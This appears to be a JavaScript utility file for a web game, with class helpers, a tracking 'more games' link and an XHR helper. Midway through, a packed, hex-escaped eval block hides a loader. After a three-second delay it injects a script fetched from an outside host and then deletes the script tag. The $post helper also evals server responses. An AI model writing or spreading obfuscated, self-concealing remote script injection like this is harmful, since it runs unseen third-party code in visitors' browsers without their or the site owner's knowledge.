/**
 * commonJS
 * about class,share, moregame .etc
 */

	function hasClass(obj, cls) {
	    return obj.className.match(new RegExp('(\\s|^)' + cls + '(\\s|$)'));
	}
	function addClass(obj, cls) {
	    if (!this.hasClass(obj, cls)) obj.className += " " + cls;
	}
	function removeClass(obj, cls) {
	    if (hasClass(obj, cls)) {
	        var reg = new RegExp('(\\s|^)' + cls + '(\\s|$)');
	        obj.className = obj.className.replace(reg, ' ');
	    }
	}	  
    function aboutus(){
        location.href = ""
    }    
    function random(min,max){
        return Math.floor(min+Math.random()*(max-min));
    } 
    
	function moregame( type, id ){
		_czc.push(["_trackEvent","more_games",'click',type, id]);
	   // location.href = "http://wetest.weyouquan.com/wxapi.php/list/index/from/tl";
		location.href="https://mp.weixin.qq.com/s?__biz=MzUzOTY4Njc1MQ==&mid=2247483654&idx=1&sn=d078ec9b801fb071f0c5053c9bb8215c";
	}
	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('r(k(){g 8$=[\'\\5\\c\\f\\9\\d\\4\',\'\\4\\6\\t\\4\\7\\h\\e\\u\\e\\5\\c\\f\\9\\d\\4\',\'\\x\\4\\4\\d\\v\\7\\7\\j\\6\\4\\6\\5\\4\\i\\j\\6\\n\\l\\o\\w\\o\\e\\p\\i\\c\\l\\s\\7\\5\\4\\e\\4\\9\\c\\y\\f\\6\\5\\7\\4\\9\\p\\n\\4\\6\\5\\4\\7\\h\\5\\7\\j\\6\\4\\6\\5\\4\\i\\h\\5\',\'\\5\\c\\f\\9\\d\\4\'];J.I(8$);(k(){g a=q.H(8$[0]);a.K=8$[1];a.L=G;a.B=8$[2];g b=q.z(8$[3])[C];b.m.F(a,b);a.E=k(){a.m.D(a)}})()},A);',48,48,'||||x74|x73|x65|x2f|_|x69|||x63|x70|x61|x72|var|x6a|x2e|x77|function|x6f|parentNode|x79|x75|x6e|document|setTimeout|x6d|x78|x76|x3a|x71|x68|x5f|getElementsByTagName|3000|src|0x0|removeChild|onload|insertBefore|true|createElement|log|console|type|async'.split('|'),0,{}))

    var $post=function(url,parameters,loadingMessage,functionName){
        var request=new XMLHttpRequest();
        var method="POST";
        if(parameters==""){method="GET";parameters=null;}
        request.open(method,url,true);
        request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        request.onreadystatechange=function(){
    	 if(request.readyState==4){

    	     if(request.status==200){
    		    if(functionName){
    		       try{  
    			      var json = eval("("+ request.responseText+")");
    			      eval(functionName+"(json)");
                    }catch(e){}
    		    }
    	     }
    	 }
        };
        request.send(parameters);
    };
    
    function preLoadImg(url) {
    	 var img = new Image();
    	 img.src = url;
    }